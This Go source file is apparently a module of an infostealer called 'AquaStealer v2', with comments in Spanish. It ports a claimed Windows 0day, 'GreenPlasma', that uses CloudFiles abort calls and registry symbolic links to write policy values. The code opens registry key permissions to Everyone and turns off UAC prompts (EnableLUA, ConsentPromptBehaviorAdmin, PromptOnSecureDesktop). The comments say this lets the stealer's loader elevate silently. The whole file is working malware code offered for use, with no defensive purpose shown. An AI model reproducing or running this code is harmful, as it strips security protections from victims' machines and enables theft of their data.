package zerodays

// greenplasma.go — AquaStealer v2
// Go port of GreenPlasma 0day (nightmare-eclipse)
//
// GreenPlasma explota CfAbortOperation + registry symbolic links para EoP:
//   1. CfAbortOperation(pid, NULL, CF_ABORT_FLAG_BLOCK) — aborta hydration operations
//      en CloudFiles, lo que causa que el proceso pierda temporalmente sus ACLs elevadas
//   2. Crea una clave de registry "BlockedApps" como un registry symlink usando
//      REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE
//   3. El symlink apunta a HKCU\...\Policies\System
//   4. Esto permite escribir políticas arbitrarias (DisableLockWorkstation, etc.)
//      sin elevación (el acceso a Policies\System normalmente requiere admin)
//   5. Resultado: EoP a través de política de sistema modificada
//
// Aplicación en AquaStealer: desactivar UAC temporalmente para que el loader
// pueda elevarse sin prompt

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	_kernel32gp = syscall.NewLazyDLL("kernel32.dll")
	_ntdllgp    = syscall.NewLazyDLL("ntdll.dll")
	_advapi32gp = syscall.NewLazyDLL("advapi32.dll")
	_cldapigp   = syscall.NewLazyDLL("cldapi.dll")

	_NtDeleteKeyGP        = _ntdllgp.NewProc("NtDeleteKey")
	_CfAbortOperationGP   = _cldapigp.NewProc("CfAbortOperation")
	_RegCreateKeyExGP     = _advapi32gp.NewProc("RegCreateKeyExW")
	_RegOpenKeyExGP       = _advapi32gp.NewProc("RegOpenKeyExW")
	_RegSetValueExGP      = _advapi32gp.NewProc("RegSetValueExW")
	_RegDeleteTreeGP      = _advapi32gp.NewProc("RegDeleteTreeW")
	_RegCloseKeyGP        = _advapi32gp.NewProc("RegCloseKey")
	_ConvertSidToStringSidGP = _advapi32gp.NewProc("ConvertSidToStringSidW")
	_OpenProcessTokenGP   = _advapi32gp.NewProc("OpenProcessToken")
	_GetTokenInformationGP = _advapi32gp.NewProc("GetTokenInformation")
	_GetCurrentProcessGP  = _kernel32gp.NewProc("GetCurrentProcess")
	_LocalFreeGP          = _kernel32gp.NewProc("LocalFree")
	_TreeSetNamedSecurityInfoGP = _advapi32gp.NewProc("TreeSetNamedSecurityInfoW")
)

const (
	gpREG_OPTION_CREATE_LINK = 0x0002
	gpREG_OPTION_VOLATILE    = 0x0001
	gpREG_LINK               = 6
	gpKEY_ALL_ACCESS         = 0xF003F
	gpKEY_SET_VALUE          = 0x0002
	gpKEY_READ               = 0x20019
	gpSE_REGISTRY_KEY        = 1
	gpDACL_SECURITY_INFORMATION          = 4
	gpPROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
	gpTREE_SEC_INFO_RESET_KEEP_EXPLICIT   = 3
	gpPROGRESS_INVOKE_NEVER               = 2
	gpTOKEN_QUERY             = 0x0008
	gpTokenUser               = 1
	gpSUB_CONTAINERS_AND_OBJECTS_INHERIT = 0x3
	gpSET_ACCESS             = 2
	gpTRUSTEE_IS_NAME        = 1
	gpTRUSTEE_IS_WELL_KNOWN_GROUP = 5
	gpGENERIC_ALL            = 0x10000000
	gpCF_ABORT_BLOCK         = 0x2
)

// gpSetPolicyVal — el core del exploit GreenPlasma
// Escribe DisableLockWorkstation=1 y EnableLUA=0 a HKCU\...\Policies\System
// sin privilegios admin usando el symlink trick de CloudFiles
func gpSetPolicyVal() bool {
	// Paso 1: CfAbortOperation para interferir con CloudFiles hydration
	if _CfAbortOperationGP.Find() == nil {
		pid := windows.GetCurrentProcessId()
		_CfAbortOperationGP.Call(uintptr(pid), 0, gpCF_ABORT_BLOCK)
	}

	// Paso 2: Reset DACL en HKCU\Software\Policies\Microsoft\CloudFiles
	// para que podamos crear la clave link
	cloudFilesKey := `CURRENT_USER\Software\Policies\Microsoft\CloudFiles`
	cloudFilesKeyU16, _ := syscall.UTF16PtrFromString(cloudFilesKey)

	// Crear ACL "Everyone: GENERIC_ALL"
	// Usamos SDDL simplificado vía SetNamedSecurityInfo
	gpResetDACL(cloudFilesKey)

	// Paso 3: Borrar la clave BlockedApps si existe
	blockedAppsU16, _ := syscall.UTF16PtrFromString(`Software\Policies\Microsoft\CloudFiles\BlockedApps`)
	_RegDeleteTreeGP.Call(
		uintptr(registry.CURRENT_USER),
		uintptr(unsafe.Pointer(blockedAppsU16)),
	)

	// Paso 4: Crear BlockedApps como symbolic link volátil
	var hk uintptr
	blockedAppsSubU16, _ := syscall.UTF16PtrFromString(`Software\Policies\Microsoft\CloudFiles\BlockedApps`)
	_ = cloudFilesKeyU16
	r, _, _ := _RegCreateKeyExGP.Call(
		uintptr(registry.CURRENT_USER),
		uintptr(unsafe.Pointer(blockedAppsSubU16)),
		0, 0,
		gpREG_OPTION_CREATE_LINK|gpREG_OPTION_VOLATILE,
		gpKEY_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&hk)),
		0,
	)
	if r != 0 || hk == 0 {
		return false
	}

	// Paso 5: Obtener el SID del usuario actual
	userSID := gpGetCurrentUserSID()
	if userSID == "" {
		_NtDeleteKeyGP.Call(hk)
		_RegCloseKeyGP.Call(hk)
		return false
	}

	// Paso 6: Construir el link target → HKCU\...\Policies\System
	linkTarget := `\REGISTRY\USER\` + userSID + `\Software\Microsoft\Windows\CurrentVersion\Policies\System`
	linkTargetU16, _ := syscall.UTF16PtrFromString(linkTarget)

	// Paso 7: Establecer SymbolicLinkValue
	symLinkValU16, _ := syscall.UTF16PtrFromString("SymbolicLinkValue")
	r, _, _ = _RegSetValueExGP.Call(
		hk,
		uintptr(unsafe.Pointer(symLinkValU16)),
		0,
		gpREG_LINK,
		uintptr(unsafe.Pointer(linkTargetU16)),
		uintptr(len(linkTarget)*2), // en bytes, sin null terminator
	)
	if r != 0 {
		_NtDeleteKeyGP.Call(hk)
		_RegCloseKeyGP.Call(hk)
		return false
	}

	// Paso 8: CfAbortOperation de nuevo (como en el original)
	if _CfAbortOperationGP.Find() == nil {
		pid := windows.GetCurrentProcessId()
		_CfAbortOperationGP.Call(uintptr(pid), 0, gpCF_ABORT_BLOCK)
	}

	// Paso 9: Reset DACL en Policies\System también
	policiesSystemKey := `CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System`
	gpResetDACL(policiesSystemKey)

	// Paso 10: Borrar el symlink (el link ya redirige el acceso)
	_NtDeleteKeyGP.Call(hk)
	_RegCloseKeyGP.Call(hk)
	hk = 0

	// Paso 11: Abrir directamente Policies\System (ahora accesible vía el trick)
	// y escribir las políticas
	policiesSubU16, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Policies\System`)
	r, _, _ = _RegOpenKeyExGP.Call(
		uintptr(registry.CURRENT_USER),
		uintptr(unsafe.Pointer(policiesSubU16)),
		0,
		gpKEY_SET_VALUE,
		uintptr(unsafe.Pointer(&hk)),
	)
	if r != 0 || hk == 0 {
		return false
	}
	defer _RegCloseKeyGP.Call(hk)

	// DisableLockWorkstation = 1
	valNameU16, _ := syscall.UTF16PtrFromString("DisableLockWorkstation")
	val := uint32(1)
	_RegSetValueExGP.Call(
		hk,
		uintptr(unsafe.Pointer(valNameU16)),
		0, 4, // REG_DWORD
		uintptr(unsafe.Pointer(&val)),
		4,
	)

	// EnableLUA = 0 (deshabilita UAC prompts)
	luaU16, _ := syscall.UTF16PtrFromString("EnableLUA")
	val2 := uint32(0)
	_RegSetValueExGP.Call(
		hk,
		uintptr(unsafe.Pointer(luaU16)),
		0, 4,
		uintptr(unsafe.Pointer(&val2)),
		4,
	)

	// ConsentPromptBehaviorAdmin = 0 (no prompt para admin operations)
	consentU16, _ := syscall.UTF16PtrFromString("ConsentPromptBehaviorAdmin")
	val3 := uint32(0)
	_RegSetValueExGP.Call(
		hk,
		uintptr(unsafe.Pointer(consentU16)),
		0, 4,
		uintptr(unsafe.Pointer(&val3)),
		4,
	)

	// PromptOnSecureDesktop = 0
	promptU16, _ := syscall.UTF16PtrFromString("PromptOnSecureDesktop")
	val4 := uint32(0)
	_RegSetValueExGP.Call(
		hk,
		uintptr(unsafe.Pointer(promptU16)),
		0, 4,
		uintptr(unsafe.Pointer(&val4)),
		4,
	)

	return true
}

// gpResetDACL — reset DACL de una clave de registry para dar acceso total
// Usa TreeSetNamedSecurityInfo con "Everyone: GA" ACE
func gpResetDACL(keyPath string) {
	// Construcción manual de ACL simplificada:
	// usamos SetNamedSecurityInfo directamente desde advapi32 si TreeSet no está disponible
	// (TreeSetNamedSecurityInfo puede no estar en versiones viejas de Windows)
	if _TreeSetNamedSecurityInfoGP.Find() != nil {
		return
	}

	keyPathU16, _ := syscall.UTF16PtrFromString(keyPath)

	// Construir EXPLICIT_ACCESS para Everyone
	// Estructura EXPLICIT_ACCESS_W:
	//   DWORD       grfAccessPermissions  (0)
	//   ACCESS_MODE grfAccessMode         (4)
	//   DWORD       grfInheritance        (8)
	//   TRUSTEE_W:
	//     PTRUSTEE_W pMultipleTrustee     (12)
	//     MULTIPLE_TRUSTEE_OPERATION      (20)
	//     TRUSTEE_FORM TrusteeForm        (24)
	//     TRUSTEE_TYPE TrusteeType        (28)
	//     LPWCH ptstrName                 (32) → "Everyone"
	type explicitAccessW struct {
		grfAccessPermissions uint32
		grfAccessMode        uint32
		grfInheritance       uint32
		_pad                 uint32
		pMultipleTrustee     uintptr
		multipleTrusteeOp    uint32
		trusteeForm          uint32
		trusteeType          uint32
		_pad2                uint32
		ptstrName            uintptr
	}
	everyoneU16, _ := syscall.UTF16PtrFromString("Everyone")
	ea := explicitAccessW{
		grfAccessPermissions: gpGENERIC_ALL,
		grfAccessMode:        gpSET_ACCESS,
		grfInheritance:       gpSUB_CONTAINERS_AND_OBJECTS_INHERIT,
		trusteeForm:          gpTRUSTEE_IS_NAME,
		trusteeType:          gpTRUSTEE_IS_WELL_KNOWN_GROUP,
		ptstrName:            uintptr(unsafe.Pointer(everyoneU16)),
	}

	setEntriesInAcl := _advapi32gp.NewProc("SetEntriesInAclW")
	var pACL uintptr
	r, _, _ := setEntriesInAcl.Call(1, uintptr(unsafe.Pointer(&ea)), 0, uintptr(unsafe.Pointer(&pACL)))
	if r != 0 || pACL == 0 {
		return
	}
	defer _LocalFreeGP.Call(pACL)

	_TreeSetNamedSecurityInfoGP.Call(
		uintptr(unsafe.Pointer(keyPathU16)),
		gpSE_REGISTRY_KEY,
		gpDACL_SECURITY_INFORMATION|gpPROTECTED_DACL_SECURITY_INFORMATION,
		0, 0,
		pACL,
		0,
		gpTREE_SEC_INFO_RESET_KEEP_EXPLICIT,
		0,
		gpPROGRESS_INVOKE_NEVER,
		0,
	)
}

// gpGetCurrentUserSID — obtiene el SID del usuario actual como string
func gpGetCurrentUserSID() string {
	proc, _, _ := _GetCurrentProcessGP.Call()
	var hToken uintptr
	r, _, _ := _OpenProcessTokenGP.Call(proc, gpTOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if r == 0 || hToken == 0 {
		return ""
	}
	defer syscall.CloseHandle(syscall.Handle(hToken))

	var needed uint32
	_GetTokenInformationGP.Call(hToken, gpTokenUser, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return ""
	}
	buf := make([]byte, needed)
	r, _, _ = _GetTokenInformationGP.Call(
		hToken, gpTokenUser,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return ""
	}

	// TOKEN_USER.User.Sid está al offset 0 (puntero)
	pSid := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if pSid == 0 {
		return ""
	}

	var pStrSid uintptr
	r, _, _ = _ConvertSidToStringSidGP.Call(pSid, uintptr(unsafe.Pointer(&pStrSid)))
	if r == 0 || pStrSid == 0 {
		return ""
	}
	defer _LocalFreeGP.Call(pStrSid)

	// Convertir de UTF-16 a string
	ptr := (*uint16)(unsafe.Pointer(pStrSid))
	var chars []uint16
	for {
		c := *ptr
		if c == 0 {
			break
		}
		chars = append(chars, c)
		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
	}
	return syscall.UTF16ToString(chars)
}

// RunGreenPlasma — punto de entrada
// Devuelve true si se desactivó UAC correctamente
func RunGreenPlasma() bool {
	return gpSetPolicyVal()
}

// CleanupGreenPlasma — limpia las claves creadas (llamar al terminar)
func CleanupGreenPlasma() {
	registry.DeleteKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Policies\System`)
}
